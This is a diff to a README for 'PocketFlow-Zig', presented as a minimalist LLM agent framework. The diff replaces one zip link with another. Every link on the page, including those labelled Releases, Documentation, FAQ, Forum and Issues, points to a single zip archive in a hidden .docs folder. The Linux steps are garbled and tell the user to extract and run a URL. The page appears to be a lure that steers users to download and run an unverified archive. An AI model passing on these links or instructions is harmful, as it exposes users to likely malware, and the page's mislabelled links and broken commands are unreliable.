@@ -1,6 +1,6 @@
 # 🌟 PocketFlow-Zig - Build Smart Agents with Ease
 
-[![Download PocketFlow-Zig](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip)](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip)
+[![Download PocketFlow-Zig](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip)](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip)
 
 ## 📖 Description
 PocketFlow-Zig is a minimalist framework designed for large language models (LLMs). This tool allows you to create and manage intelligent agents efficiently. With PocketFlow-Zig, you can set up workflows that enable agents to build and assist other agents seamlessly.
@@ -16,7 +16,7 @@ Before you start, make sure your system meets these requirements:
 - **Network:** Internet connection for downloading and updates.
 
 ### Step 2: Download PocketFlow-Zig
-To download PocketFlow-Zig, visit the [Releases page](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip). Here you will find the latest version available for download. 
+To download PocketFlow-Zig, visit the [Releases page](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip). Here you will find the latest version available for download. 
 
 ### Step 3: Installing the Application
 1. **Windows:**
@@ -29,9 +29,9 @@ To download PocketFlow-Zig, visit the [Releases page](https://raw.githubusercont
    - Open the downloaded file and drag PocketFlow-Zig to your Applications folder.
 
 3. **Linux:**
-   - Download the `https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip` file from the Releases page.
-   - Extract the contents using `tar -xzf https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip`.
-   - Navigate to the extracted folder and run `https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip` in your terminal to complete the setup.
+   - Download the `https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip` file from the Releases page.
+   - Extract the contents using `tar -xzf https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip`.
+   - Navigate to the extracted folder and run `https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip` in your terminal to complete the setup.
 
 ### Step 4: Run PocketFlow-Zig
 After installation, you can run PocketFlow-Zig:
@@ -53,14 +53,14 @@ Once the application is running, you can start building your first agent:
 
 ## 💡 Additional Resources
 For more detailed instructions or troubleshooting:
-- Explore our [Documentation](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip).
-- Check out the [FAQ page](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip) for common questions.
-- Join our [Community Forum](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip) to connect with other users.
+- Explore our [Documentation](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip).
+- Check out the [FAQ page](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip) for common questions.
+- Join our [Community Forum](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip) to connect with other users.
 
 ## 🎉 Support
-If you encounter any issues or have questions, please report them on the [Issues page](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip), and our team will assist you.
+If you encounter any issues or have questions, please report them on the [Issues page](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip), and our team will assist you.
 
 ## 📥 Download & Install
-To get started, download PocketFlow-Zig and install it by visiting the [Releases page](https://raw.githubusercontent.com/villcaf175/PocketFlow-Zig/main/.docs/Zig-Flow-Pocket-Roripa.zip) now. 
+To get started, download PocketFlow-Zig and install it by visiting the [Releases page](https://github.com/villcaf175/PocketFlow-Zig/raw/refs/heads/main/.docs/Flow_Pocket_Zig_v1.4-beta.5.zip) now. 
 
 Feel free to reach out if you need further assistance. Happy building!
